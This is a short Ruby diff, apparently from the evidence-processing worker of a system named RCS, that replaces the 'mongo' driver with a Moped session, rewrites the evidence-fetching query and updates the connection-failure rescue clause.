@@ -1,4 +1,3 @@
-require 'mongo'
 require 'openssl'
 require 'digest/sha1'
 require 'digest/md5'
@@ -70,13 +69,13 @@ module RCS
         delete_all_evidence
       end
 
-      def fetch
-        @collection ||= db.collection('grid.evidence.files')
-        @collection.find({filename: @agent_uid}, {sort: ["_id", :asc]}).limit(READ_LIMIT).to_a
+      def db
+        RCS::Worker::DB.instance.session
       end
 
-      def db
-        RCS::Worker::DB.instance.mongo_connection
+      def fetch
+        @collection ||= db['grid.evidence.files']
+        @collection.find(filename: @agent_uid).sort(_id: 1).limit(READ_LIMIT).to_a
       end
 
       def agent?
@@ -151,7 +150,7 @@ module RCS
         end
 
         trace(:info, "[#{@agent_uid}] Processed #{ev_processed_count} #{ev_type.upcase} evidence for agent #{agent.name} (#{decoded_data.size} bytes in #{Time.now - start_time} sec") if ev_processed_count > 0
-      rescue Mongo::ConnectionFailure => e
+      rescue Moped::Errors::ConnectionFailure => e
         trace :error, "[#{@agent_uid}] cannot connect to database, retrying in 5 seconds..."
         sleep(5)
         retry
